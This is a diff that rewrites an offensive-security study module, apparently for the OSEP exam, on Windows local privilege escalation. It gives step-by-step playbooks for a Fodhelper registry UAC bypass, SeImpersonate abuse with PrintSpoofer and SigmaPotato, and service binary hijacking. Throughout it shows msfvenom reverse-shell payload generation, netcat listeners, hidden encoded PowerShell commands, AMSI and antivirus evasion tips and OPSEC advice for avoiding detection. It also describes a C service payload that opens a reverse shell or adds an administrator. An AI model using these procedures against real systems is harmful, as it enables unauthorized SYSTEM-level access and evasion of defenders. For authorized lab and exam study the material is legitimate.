@@ -2,46 +2,35 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 06 · UAC Bypass & Windows local privilege escalation (scenarios 25–27)
+# UAC bypass and local privilege escalation
 
-> **Covers scenarios:** 25, 26, 27
->
-> **Course mapping:** Chapter 12 (§12.5 UAC Bypass vs Microsoft Defender / FodHelper), Chapter 17 (§17.2.2 Elevation with Impersonation), Chapter 24 (§24.2.1 Privilege Escalation on web01)
->
-> **Keywords:** `UAC Bypass` `PrintSpoofer` `SigmaPotato` `FullPowers` `AlwaysInstallElevated` `Service Binary Hijacking`
->
-> Related modules: this module covers **local privilege escalation after the first foothold**. Lateral movement: [15-winrm-lateral](/modules/15-winrm-lateral). Credential collection: [07-credentials-lsass](/modules/07-credentials-lsass).
->
-> Shared placeholders: `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`.
+If you already have a shell, pick the path from the token you have now. Admin on a filtered token → Fodhelper. Service context with SeImpersonate → PrintSpoofer / SigmaPotato. Writable high-privilege service → hijack the binary.
 
-Recommended triage order for the three priv-esc shapes in this module:
-
-1. **Already an admin but on a filtered token** (UAC medium integrity) → scenario 25 (Fodhelper-style UAC bypass).
-2. **Service account / low priv but holds SeImpersonatePrivilege** → scenario 26 (PrintSpoofer / SigmaPotato family).
-3. **Write access to a local service / can start-stop it** → scenario 27 (service binary hijack).
-
-Run a quick identity check before picking a path:
+Check identity first:
 
 ```powershell
 whoami /all                     # Mandatory Label (integrity), Privileges (SeImpersonate, etc.)
 net localgroup administrators    # already a local Administrators member?
-sc qc <ServiceName>              # used later in scenario 27
+sc qc <ServiceName>              # used later for service hijack
 ```
 
----
+After you elevate, collect credentials ([07-credentials-lsass](/modules/07-credentials-lsass)) or move laterally ([15-winrm-lateral](/modules/15-winrm-lateral)).
 
-## Scenario 25 · Unelevated token → Fodhelper registry UAC Bypass
+## Admin, but medium integrity
 
-### Situation
-Via phishing/webshell/creds you have a token that is a **local Administrators member but unelevated** (`whoami /groups` shows `Mandatory Label\Medium Mandatory Level`, yet the user is in `BUILTIN\Administrators`). Goal: run a high-integrity command and bypass UAC. On common Win10/11 defaults `ConsentPromptBehaviorAdmin=5` (prompt for credentials) — automatic UAC bypass still requires the **user already be an Administrators member**; if `EnableLUA=0` or prompt behavior = always ask (value 2), this path may not apply.
+If `whoami /groups` shows `Mandatory Label\Medium Mandatory Level` and the user is in `BUILTIN\Administrators`, use a Fodhelper-style UAC bypass. This only works when UAC is on (`EnableLUA=1`) and the user is already an Administrators member. If `EnableLUA=0`, you are already high integrity — no bypass needed. If the user is not an admin, this path is dead; go to SeImpersonate or service hijack.
 
-### Assumptions
-- Current user `USER` is in the local `Administrators` group, and UAC is on (`EnableLUA=1`, default).
-- You have a writable place for the payload (usually the user profile; high rights not required).
-- Target has no full AV/EDR blocking registry writes or spawn behavior (if it does, see failure branches).
-- Common exam variants: Fodhelper, ComputerDefaults, wsreset, eventvwr (newer builds may be fixed / path-sensitive).
+The default `ConsentPromptBehaviorAdmin=5` is "prompt for consent for non-Windows binaries", not "prompt for credentials" (that is 1 or 3). Auto-elevate still requires Administrators membership. If the prompt behavior is always-ask (value 2, consent on the secure desktop), this path may not apply.
 
-### Prepare (attacker)
+- [ ] Confirm Administrators membership and medium integrity
+- [ ] Generate the payload and start a listener
+- [ ] Write `DelegateExecute` (empty string) first, then the default command value
+- [ ] Trigger `fodhelper.exe` (or `computerdefaults.exe` / `wsreset.exe` / `slui.exe`)
+- [ ] Confirm `High Mandatory Level` in the new process
+- [ ] Delete the registry key
+
+Generate a payload and listen:
+
 ```bash
 # 1. Generate reverse shell or beacon
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe -o svc.exe   # service-binary example
@@ -51,8 +40,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f exe
 nc -lvnp LPORT            # or msfconsole handler / CS listener
 ```
 
-### Procedure
-Principle: `fodhelper.exe` (Windows Features helper under `C:\Windows\System32`, auto-elevate manifest by default) queries `HKCU\Software\Classes\ms-settings\Shell\Open\command` at start; if present it runs that command **at high integrity**. Because the key is under `HKCU`, an unelevated process can write it.
+`fodhelper.exe` (Windows Features helper under `C:\Windows\System32`, auto-elevate by default) queries `HKCU\Software\Classes\ms-settings\Shell\Open\command` at start; if present it runs that command **at high integrity**. Because the key is under `HKCU`, an unelevated process can write it.
 
 ```powershell
 # On target (medium-integrity shell / webshell)
@@ -72,31 +60,13 @@ reg delete "HKCU\Software\Classes\ms-settings" /f
 
 Integrated script: `m06-fodhelper-uac.ps1` (writes keys, triggers, optional delayed cleanup).
 
-### Lab files
-- `m06-fodhelper-uac.ps1`
+Verify: `whoami /groups` in the new process shows `High Mandatory Level`; `net session` no longer reports "Access is denied", or you can read admin-only paths.
 
-### Verify
-- `whoami /groups` in the reverse shell shows `High Mandatory Level`;
-- `net session` no longer reports “Access is denied”, or you can read admin-only paths.
+If the command never ran and there is no error, start `cmd /c fodhelper.exe` yourself and confirm the empty `DelegateExecute` string plus the default value name — then try `computerdefaults.exe`. If AMSI or Defender kills the default Metasploit module (`exploit/windows/local/bypassuac_fodhelper`), put an AMSI bypass plus a short download cradle in the registry value (course §12.5.2) instead of that module. If AV blocks `reg add` or the spawn, split the write and the trigger (write from the shell, trigger via `schtasks /run`); payload as fileless encoded PowerShell plus AMSI handling (module 05); clean the key afterward. If Fodhelper is disabled or redirected by policy, try `computerdefaults.exe`, `wsreset.exe`, or `slui.exe`. If AlwaysInstallElevated is on (`HKLM` and `HKCU` `...\Windows Installer` both 1), `msiexec /quiet /qn /i payload.msi` elevates directly — probe both registry paths first (the script includes probe commands).
 
-### If it fails
-1. **Command never ran and no error**: manually `cmd /c fodhelper.exe` and watch; confirm the empty `DelegateExecute` string and the default value name (not a `(Default)` quoting issue); try `computerdefaults.exe`.
-2. **Old Win10 / UAC off / user not admin**: with `EnableLUA=0` you do not need a bypass (already high rights); if the user is not an Administrators member, Fodhelper is useless → switch to service priv-esc / kernel (scenarios 26/27 here, or historical bugs like MS16-032 — exam usually does not test kernel).
-3. **AV blocks `reg add` or spawn**: split registry write and trigger into two stages (write via shell, trigger via scheduled task or `schtasks /run`); payload as fileless encoded PowerShell + AMSI handling (see M05); clean the key afterward to avoid an obvious IOC.
-4. **Fodhelper disabled / path redirected by policy**: try `computerdefaults.exe`, `wsreset.exe`, `slui.exe` same family; or switch to `AlwaysInstallElevated` (see tip below).
-5. Unstable reverse shell: skip persistence first; run a fixed command (who starts it, at what rights — see `m06-fodhelper-uac.ps1` notes).
+Always delete the key after use — later Settings-class actions for that user will re-trigger the command and leave persistence. Fodhelper may flash a UAC dialog in an interactive session; prefer a short, non-interactive command. Callbacks use `LHOST`/`LPORT`; do not hardcode attacker LAN IPs. What you get is still a **same-user** high-integrity token, not SYSTEM — go to credentials (module 07) or, if you still need SYSTEM, SeImpersonate or service hijack.
 
-> Tip: AlwaysInstallElevated (`HKLM\...\Windows Installer` and `HKCU\...\Windows Installer` both 1) lets you `msiexec /quiet /qn /i payload.msi` for direct elevation — a separate cheat-sheet entry; probe both registry paths first (the script includes probe commands).
-
-### Exam / OPSEC notes
-- **Always clean the registry key after use** (`reg delete`); otherwise later settings-class actions for that user re-trigger the command and leave persistence.
-- Fodhelper may flash a UAC dialog — visible in an interactive session; if the environment allows, prefer non-interactive payloads + short commands.
-- Callbacks always use `LHOST/LPORT`; do not hardcode attacker LAN IPs in commands (blue team/EDR correlation).
-- What you get is still a **same-user** high-integrity token, not SYSTEM — do not confuse later lateral/priv-esc steps.
-
----
-
-#### `m06-fodhelper-uac.ps1`
+::: details `m06-fodhelper-uac.ps1` · click to expand
 
 ````powershell
 <#
@@ -191,29 +161,23 @@ Write-Log "[*] verify: whoami /groups in reverse/child process should show High 
 Write-Log "[*] failure triage: A) DelegateExecute written?  B) try -HostBin ComputerDefaults  C) user really Administrators member?  D) command itself blocked by AV? (first prove high rights with cmd /c whoami > file)"
 ````
 
-## Scenario 26 · SeImpersonate token → PrintSpoofer / SigmaPotato
+:::
+## SeImpersonate in a service context
 
-### Situation
-You have a foothold where you can run commands as a **service account or local service context** (e.g. webshell as IIS AppPool, SQL Server `xp_cmdshell`, a Windows service itself). `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`). Goal: get `NT AUTHORITY\SYSTEM`.
+If the foothold is a service account or local service context (IIS AppPool, SQL `xp_cmdshell`, a Windows service) and `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`), go for `NT AUTHORITY\SYSTEM`. If the privilege is present but Disabled, restore it with FullPowers first, then retry. If the host is Windows 10/11 or Server 2016+, try PrintSpoofer first — it is easier. If egress is constrained or PrintSpoofer fails, use a SigmaPotato local variant (no callback needed). If the host is older (Server 2008/2012, Win7/8), go to JuicyPotato / RoguePotato.
 
-### Assumptions
-- Process token has `SeImpersonatePrivilege` (default for all service accounts, IIS AppPool, MSSQL service accounts).
-- Attacker can reach a **writable directory** on the target (drop tools/binaries), or the target can egress to download.
-- When the service runs as `LocalSystem`/`NetworkService`/`LocalService`, the other side must either callback to the attacker listener (PrintSpoofer style) or use local loopback (many Potato variants need no egress).
+- [ ] Confirm `SeImpersonatePrivilege` is **Enabled** (`whoami /priv`)
+- [ ] Land the tool (AppPool-writable dir, `%TEMP%`, or reflective load)
+- [ ] Start a listener if the tool callbacks (PrintSpoofer); skip it for local Potato variants
+- [ ] Execute and confirm `whoami` is `nt authority\system`
 
-### Prepare (attacker)
+PrintSpoofer (https://github.com/itm4n/PrintSpoofer) and SigmaPotato (https://github.com/Kevin-Robertson/SigmaPotato) are the usual pair. Build C++ tools in VS as x64; match static/dynamic to the target.
+
 ```bash
-# PrintSpoofer (Windows 10/11 + Server 2016+ — most stable)
-#  - local https://github.com/itm4n/PrintSpoofer (release binaries)
-# SigmaPotato (modern Potato family; Variant 1 = local, Variant 2/3 use RPC to attacker)
-#  - local https://github.com/Kevin-Robertson/SigmaPotato
-# Self-build notes: C++ project in VS, target x64; static/dynamic per target.
-
 # Attacker listener (PrintSpoofer needs one; SigmaPotato local variants do not):
 nc -lvnp LPORT
 ```
 
-### Procedure
 ```powershell
 # 0) Confirm the privilege is actually enabled (many tool failures are Disabled privilege → FullPowers / enable first):
 whoami /priv
@@ -232,32 +196,17 @@ SigmaPotato.exe -cmd "powershell -nop -w hidden -enc <BASE64>"                  
 #    When RoguePotato / PrintSpoofer do not apply, use JuicyPotato (2012/2016 older) or Potato family
 ```
 
-### Lab files
-- `m06-sigmapotato-reflect.ps1` (offline self-contained — no landed EXE; reflectively runs SigmaPotato core logic; also the carrier for “manual fallback when auto tools fail”)
-- Alternate tool shapes in the docs: PrintSpoofer binary, JuicyPotato, RoguePotato, SpoolSample (print spooler coerced auth — see below).
+If you cannot land an EXE, use `m06-sigmapotato-reflect.ps1` (memory-loads SigmaPotato; also the fallback when auto tools fail). Alternates: PrintSpoofer binary, JuicyPotato, RoguePotato, SpoolSample.
 
-### Verify
-- After exec, `whoami` returns `nt authority\system`;
-- `whoami /groups` shows `Mandatory Label\High Mandatory Level` (SYSTEM is always high).
+Verify: `whoami` returns `nt authority\system`; `whoami /groups` shows `Mandatory Label\High Mandatory Level`.
 
-### If it fails
-1. **Tool exits immediately / no output**: check whether the privilege is **Disabled** (`whoami /priv` shows Disabled) — SeImpersonate on service-account tokens is often disabled; restore with FullPowers (GitHub itm4n/FullPowers) or re-steal the token, then retry; also check OS version vs tool (PrintSpoofer needs Server 2016/Win10 1607+; older hosts → JuicyPotato/RoguePotato).
-2. **AV kills the tool / cannot land**: use `m06-sigmapotato-reflect.ps1` reflective exec, or encode then memory-load (M05/M01 ideas); last resort **manual**: .NET `DuplicateToken` + create a process with the SYSTEM token (script includes a minimal approach).
-3. **PrintSpoofer needs a callback but target egress is constrained**: switch to SigmaPotato/JuicyPotato local-loopback variants (no egress); or coerce SYSTEM to callback to the attacker over SMB/HTTP (SpoolSample + relay — see M16/M11 relay ideas).
-4. **You got some other account, not SYSTEM**: check the service run-as account — under `NetworkService`, PrintSpoofer usually still reaches SYSTEM (print spooler is SYSTEM); if the service is a normal account without SeImpersonate, this path is dead → scenario 27.
-5. Tool needs .NET/runtime: on older hosts confirm PowerShell/.NET version first (PowerShell-implemented SigmaPotato has no binary dependency).
+If the tool exits immediately, check whether the privilege is Disabled — FullPowers (https://github.com/itm4n/FullPowers) or re-steal the token, then retry; also match OS to tool (PrintSpoofer needs Server 2016 / Win10 1607+; older hosts → JuicyPotato / RoguePotato). If AV kills the binary, switch to the reflective script or encode and memory-load (modules 05 / 01); last resort is a manual `DuplicateToken` plus a SYSTEM process (the script includes a minimal approach). If PrintSpoofer needs a callback but egress is blocked, switch to a local-loopback Potato variant, or coerce SYSTEM to a host you control (SpoolSample + relay — see modules 16 / 11). If you landed some other account, not SYSTEM, check the service run-as — under `NetworkService`, PrintSpoofer usually still reaches SYSTEM (the spooler is SYSTEM); if the service is a normal account without SeImpersonate, this path is dead → service hijack. On older hosts, confirm PowerShell / .NET first (the PowerShell SigmaPotato path has no native binary dependency).
 
-> SpoolSample (print spooler) in this scenario: it is **auth coercion**, not direct priv-esc — make `potato`/`printbug` trigger SYSTEM auth to a host you control, then relay or RPC-abuse (classic Printerbug → Relay to LDAP/ADCS; see [12-ad-attacks](/modules/12-ad-attacks) ESC8). If every local potato path fails, this is the exam “fallback path”.
+SpoolSample in this section is **auth coercion**, not direct priv-esc — make the spooler trigger SYSTEM auth to a host you control, then relay or RPC-abuse (PrinterBug → LDAP / ADCS; see [12-ad-attacks](/modules/12-ad-attacks) ESC8). If every local potato path fails, this is the exam fallback.
 
-### Exam / OPSEC notes
-- Delete uploaded EXEs or park them in dirs that get cleaned; reflective scripts with no disk drop are the cleanest shape.
-- PrintSpoofer reverse uses `LHOST:LPORT` — offset port/protocol from stage-one listeners to avoid log confusion.
-- Confirm priv-esc once (`whoami`); do not spam SYSTEM shells and make noise.
-- Interactive `-i` popups are useless in service contexts with no desktop — always use `-c` with a command.
+Delete uploaded EXEs or park them in directories that get cleaned; a reflective script with no disk drop is quieter. Offset PrintSpoofer's `LHOST`/`LPORT` from the stage-one listener. Confirm once with `whoami`; do not spam SYSTEM shells. Interactive `-i` popups are useless in a service context with no desktop — always use `-c` with a command.
 
----
-
-#### `m06-sigmapotato-reflect.ps1`
+::: details `m06-sigmapotato-reflect.ps1` · click to expand
 
 ````powershell
 <#
@@ -348,26 +297,26 @@ try {
 }
 ````
 
-## Scenario 27 · Manual service binary hijack (with rollback)
+:::
+## Writable service binary
 
-### Situation
-After a low-priv foothold, `sc qc` / `wmic service` shows a Windows service whose **binary path points to a writable location**, or whose **registry ImagePath is writable**, and the service can be (re)started/stopped. Goal: replace the service binary with your payload, wait for SYSTEM start → elevate.
+If a low-priv foothold can change a service that runs as `LocalSystem` (writable binary directory, or writable `ImagePath`) and can start or stop it — or the service restarts on reboot or crash — replace the binary, wait for SYSTEM to start it, then roll back.
 
-### Assumptions
-- Service runs as `LocalSystem` (or another high-rights account);
-- Binary directory is **writable** by the current user, or service config (`HKLM\SYSTEM\CurrentControlSet\Services\<svc>`) `ImagePath` is writable/changeable;
-- Low-priv user can `start/stop` (`sc start` is not access-denied), or the service auto-restarts on reboot/crash (exam labs often allow direct service restart);
-- You confirmed the original service is not required for continued exam progress (minimize damage — see rollback).
+- [ ] Enumerate writable services (`wmic` / `sc qc` / `accesschk`)
+- [ ] Export the original registry key and back up the original exe **before** touching anything
+- [ ] Build a payload that matches the service arch
+- [ ] Replace the binary, or point `ImagePath` at the payload
+- [ ] Trigger with `sc stop` / `sc start` (or a scheduled / reboot trigger)
+- [ ] Confirm a SYSTEM shell, then restore immediately
 
-### Prepare (attacker)
+Build the payload with `m06-service-binary-payload.c`:
+
 ```bash
-# Build payload with m06-service-binary-payload.c:
 #   x86_64-w64-mingw32-gcc -o svcpayload.exe m06-service-binary-payload.c   (Linux cross-compile)
 #   or VS: cl m06-service-binary-payload.c
 # Match service arch: 32-bit service process → build x86; 64-bit → x64.
 ```
 
-### Procedure (checklist)
 ```powershell
 # 1) Enumerate writable services (three angles):
 wmic service get name,pathname,startname | findstr /i "LocalSystem"
@@ -401,30 +350,15 @@ reg import C:\Windows\Temp\<svc>-backup.reg /y   # if method A and registry was 
 sc start <svc>                                   # restore original service (confirm it starts)
 ```
 
-### Lab files
-- `m06-service-binary-payload.c` (service payload: on start, spawn reverse shell or add admin; optionally stay alive so the service “looks alive”)
-- `m06-service-hijack.ps1` (full hijack + rollback automation that saves/restores original config)
+Automation: `m06-service-hijack.ps1` (saves and restores the original config). The C payload spawns a reverse shell or adds an admin; it does not register a service main, so `sc start` may error 1053 while the child already called back — that is expected.
 
-### Verify
-- After trigger, attacker listener receives a SYSTEM shell (`whoami` → `nt authority\system`);
-- After rollback, `sc start <svc>` succeeds and the original process is healthy.
+Verify: the listener receives a SYSTEM shell (`whoami` → `nt authority\system`); after rollback, `sc start <svc>` succeeds and the original process is healthy.
 
-### If it fails
-1. **`sc start` reports “Access is denied”**: low-priv users can usually only start some services — pick a startable one (prefer third-party software services, `Auto` start, no `ChangeConfig` protection); or use **scheduled task / Run key** (if the user can write `HKLM\...\Run` or Startup — only takes effect on next logon/reboot).
-2. **Service fails to start after replace**: payload did not implement a service main / `SERVICE_START` fails — `m06-service-binary-payload.c` does not register with SCM; it forks a reverse connect (service start may error while the child already egressed); `sc start` erroring while the shell is back is expected. For a “healthy” service (quieter), build a version with a minimal service main loop.
-3. **Directory writable but replace is locked / AV blocks**: stop the service first, then replace; if AV blocks, switch to fileless (ImagePath pointing at `rundll32`/`regsvr32` for a script stage? — no, ImagePath must be an EXE; you can set ImagePath to `powershell.exe -enc` using a binary already on the host).
-4. **No writable service found**: widen enum (`icacls` on third-party install dirs), or evaluate creating your own service (if `sc create` is allowed, point it at your payload — needs rights like SeServiceLogonRight; common in weak ops configs); if none work, revisit scenarios 25/26.
-5. Rollback fails and the target service stays broken: **export registry and back up the original exe before touching anything** is a hard requirement; if it still will not start after rollback, `reg import` and restart (see `m06-service-hijack.ps1` restore branch).
+If `sc start` reports "Access is denied", pick a startable service (prefer third-party, Auto start, no `ChangeConfig` protection), or use a scheduled task / Run key if you can write it (next logon or reboot). If the service fails to start after the replace, treat a returned shell as success and roll back; for a quieter "healthy" service, build a version with a minimal service main loop (`-DSERVICE_STAYALIVE` plus a dispatcher). If the file is locked or AV blocks the replace, stop the service first; if AV still blocks, set `ImagePath` to a host binary such as `powershell.exe -enc` instead of dropping a new EXE. If no writable service turns up, widen enum (`icacls` on third-party install dirs) or evaluate `sc create` if those rights exist; otherwise revisit Fodhelper / SeImpersonate. If rollback fails, `reg import` the backup and restart (see the script's Restore branch) — exporting the key and backing up the exe **before** the change is a hard requirement.
 
-### Exam / OPSEC notes
-- **Rollback is a scoring point**: exam environments often require restoring original state; do not break a service the later stages still need.
-- Replacing built-in services (e.g. `Spooler`) is loud and easy to spot; prefer third-party / lab-planted weak services.
-- Name the payload close to the original service (e.g. `svc.exe`), land under `%TEMP%` or delete after use to avoid persistence artifacts.
-- Scheduled-task / reboot triggers need careful assessment of collateral damage in the exam (reboot may kill your other channels).
+Rollback is a scoring point: do not break a service later stages still need. Prefer third-party or lab-planted weak services over built-in ones (Spooler is loud). Name the payload close to the original, land under `%TEMP%`, and delete after use. A reboot trigger may kill your other channels — use it carefully.
 
----
-
-#### `m06-service-binary-payload.c`
+::: details `m06-service-binary-payload.c` · click to expand
 
 ````c
 /*
@@ -531,7 +465,8 @@ int main(void)
 }
 ````
 
-#### `m06-service-hijack.ps1`
+:::
+::: details `m06-service-hijack.ps1` · click to expand
 
 ````powershell
 <#
@@ -634,12 +569,13 @@ Write-Log "[*] after shell: roll back with -Action Restore -ServiceName $Service
 Write-Log "[*] if Restore finds exe locked (payload process still alive): taskkill /F /IM <payload-name> then re-run Restore"
 ````
 
-## Appendix: module quick lookup
+:::
+## Cheat sheet
 
-| Condition | Technique | Script/tool |
+| Condition | Technique | Script / tool |
 |---|---|---|
 | Administrators member + medium integrity | Fodhelper / ComputerDefaults / AlwaysInstallElevated | `m06-fodhelper-uac.ps1` |
-| SeImpersonate + service context | PrintSpoofer → SigmaPotato (when egress constrained) → older JuicyPotato | `m06-sigmapotato-reflect.ps1` |
-| Writable service binary/ImagePath | Service binary hijack + registry backup rollback | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |
+| SeImpersonate + service context | PrintSpoofer → SigmaPotato (when egress is constrained) → older JuicyPotato | `m06-sigmapotato-reflect.ps1` |
+| Writable service binary / ImagePath | Service binary hijack + registry backup rollback | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |
 
-Fixed actions after elevate: record new integrity with `whoami /groups` → credentials if needed: [07-credentials-lsass](/modules/07-credentials-lsass) → lateral: [15-winrm-lateral](/modules/15-winrm-lateral).
+After elevate: record the new integrity with `whoami /groups` → credentials if needed: [07-credentials-lsass](/modules/07-credentials-lsass) → lateral: [15-winrm-lateral](/modules/15-winrm-lateral).
